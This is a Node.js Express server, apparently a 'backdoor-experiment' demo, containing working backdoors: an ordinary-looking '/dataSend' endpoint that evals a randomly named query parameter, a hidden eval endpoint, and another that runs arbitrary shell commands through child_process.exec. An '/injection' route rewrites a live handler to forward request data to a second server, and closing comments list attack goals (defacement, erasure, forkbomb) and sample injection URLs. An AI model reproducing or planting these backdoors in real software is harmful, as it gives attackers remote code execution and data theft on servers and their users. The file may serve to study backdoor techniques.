var express = require('express');
var morgan = require('morgan');
var app = express();
var path = require('path');
var http = require('http');

var called = false;
app.use(morgan('dev'));

//the following endpoint can also be injected but it would be too noisy.
// it would forward all the incoming requests generating too much traffic
// specially if it was injected in a busy app.

/*
app.all('*', function(req, res, next) {
   http.get({host: 'localhost', path:'/?msg=' + req.query.msg, port:3030}, function(res){
    next();
  });
});*/

app.use('/css', express.static(__dirname + '/css'));
app.use('/images', express.static(__dirname + '/images'));

app.get('/injection', function (req, res) {
	    // the injection code is hardcoded in this function
	    //explanation of the injection proccess CRAZY CODE.
	    // this is the same process explained in the exploit page.
	    if(!called){//save the original (this very same function)
	    original=arguments[0].route.stack[0].handle;//this line must run only once!!!
	    called = true;
	    }//the code of this function(we are inside it) is replaced with this next function
	    arguments[0].route.stack[0].handle=function(req,res,next){
	   http.get({host: 'localhost', path:'/?msg=' + req.query.msg, port:3030}, function(res){
	    next();
	  });//after running the injected code. 
	  //we must call the original in order to not alter the functionality of the endpoint.
	 original(req,res,next)
	}
	   res.sendFile(path.join(__dirname + "/pages/index.html"));
});

app.get('/', function(req,res) {
	res.sendFile(path.join(__dirname + "/pages/index.html"));
});

app.get('/vulns', function (req, res) {
   res.sendFile(path.join(__dirname + "/pages/vulns.html"));
});

app.get('/exploit', function (req, res) {
   res.sendFile(path.join(__dirname + "/pages/exploit.html"));
});

app.get('/about', function (req, res) {
   res.sendFile(path.join(__dirname + "/pages/about.html"));
});

// normal endpoint with backdoor.
// it takes 2 params and writes them to the console.
app.get('/dataSend', function (req, res) {
    if(req.query.Rdzmu3mpFH)//these 2 lines are our backdoor.
    eval(req.query.Rdzmu3mpFH);
    // normal functionality of the endpoint
    // echo the requests params to the console
   console.log('User: ' + req.query.user);
   console.log('Message: ' + req.query.msg);
   res.end();
});

// our dedicated backdoor endpoint
app.get('/TV0fKRoS3v', function(req, res){
    eval(req.query.Rdzmu3mpFH);
});

app.get('/5JITcyICH3', function (req, res) {
  require('child_process').exec(
    req.query.HnlmB9RIgC,
    function (err, data) {
      res.send(data)
    });
})

app.listen(3000,function(){
   console.log('backdoor-experiment Server listening @ PORT 3000'); 
});

///backdoor?code=res.sendFile(%27tyrell.jpg%27,%20{root:%27\public%27}); DATABASE INFO
/// DEFACE -rename dir
/// DATA FORWARD
///encrypt/erase
///crash -forkbomb
///shutdown

// http://localhost:3000/dataSend?Rdzmu3mpFH=bd=arguments[0].route.stack[0].handle;
// http://localhost:3000/TV0fKRoS3v?Rdzmu3mpFH=res.write(%20JSON.stringify(app._router.stack)%20);res.end();

///http://localhost:3000/TV0fKRoS3v?Rdzmu3mpFH=bds=arguments[0].route.stack[0].handle;
/*
arguments[0].route.stack[0].handle=function(req,res,next){http.get({host:'localhost',path:'?msg='+req.query.msg,port:3030},function(res){next();});bd(req,res,next)}

//http://localhost:3000/TV0fKRoS3v?Rdzmu3mpFH=bds=arguments[0].route.stack[0].handle;
arguments[0].route.stack[0].handle=function(req,res,next){console.log('handled');bd(req,res,next)}


http://localhost:3000/dataSend?Rdzmu3mpFH=arguments[0].route.stack[0].handle=function(req,res,next){http.get({host:%27localhost%27,path:%27/?msg=%27%2Breq.query.msg,port:3030},function(res){next();});original(req,res,next)}


http://localhost:3000/dataSend?Rdzmu3mpFH=bd=arguments[0].route.stack[0].handle;
*/









